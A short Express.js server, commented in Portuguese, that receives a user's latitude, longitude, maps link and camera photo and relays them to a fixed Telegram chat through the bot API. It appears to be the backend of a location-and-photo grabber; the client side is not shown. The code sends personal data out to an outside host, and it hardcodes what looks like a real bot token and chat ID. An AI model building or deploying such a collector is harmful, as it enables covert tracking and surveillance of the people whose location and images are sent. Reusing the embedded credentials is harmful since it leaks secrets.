const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const axios = require("axios");
const FormData = require("form-data");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: "10mb" })); // Aumenta limite para imagens em base64

const TELEGRAM_BOT_TOKEN = "7674928346:AAEd6FNCSB_ozfmqs7islmmEaH6x8bWivVQ"; // Seu token
const TELEGRAM_CHAT_ID = "1276935257"; // Seu chat ID

app.post("/send-location-photo", async (req, res) => {
  const { latitude, longitude, maps, photo } = req.body;

  if (!latitude || !longitude || !maps) {
    return res.status(400).json({ success: false, message: "Dados insuficientes" });
  }

  try {
    // Envia mensagem com a localização
    const message = `📍 Localização do usuário:\nLatitude: ${latitude}\nLongitude: ${longitude}\n${maps}`;
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    // Envia foto, se existir
    if (photo) {
      const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, "base64");

      const form = new FormData();
      form.append("chat_id", TELEGRAM_CHAT_ID);
      form.append("photo", buffer, {
        filename: "foto.png",
        contentType: "image/png",
      });

      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, form, {
        headers: form.getHeaders(),
      });
    }

    res.json({ success: true });
  } catch (error) {
    console.error("Erro ao enviar para Telegram:", error.response?.data || error.message || error);
    res.status(500).json({ success: false, message: "Erro ao enviar os dados." });
  }
});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});

